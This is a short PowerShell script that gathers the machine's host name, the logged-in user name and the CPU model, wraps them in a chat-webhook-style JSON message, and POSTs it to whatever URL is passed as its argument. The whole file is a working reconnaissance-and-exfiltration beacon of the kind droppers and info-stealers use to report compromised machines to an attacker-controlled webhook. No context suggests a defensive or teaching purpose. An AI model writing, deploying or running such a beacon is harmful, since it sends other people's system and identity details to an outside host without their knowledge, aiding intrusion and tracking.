$w=$args[0]
$sys = Get-ComputerInfo
$cpu = (Get-CimInstance Win32_Processor).Name
$data = @{
    content = "### :upside_down::upside_down::upside_down:
**Host:** $($sys.CsName)
**User:** $env:USERNAME
**CPU:** $cpu"
}
irm $w -Method Post -Body ($data | ConvertTo-Json) -ContentType "application/json"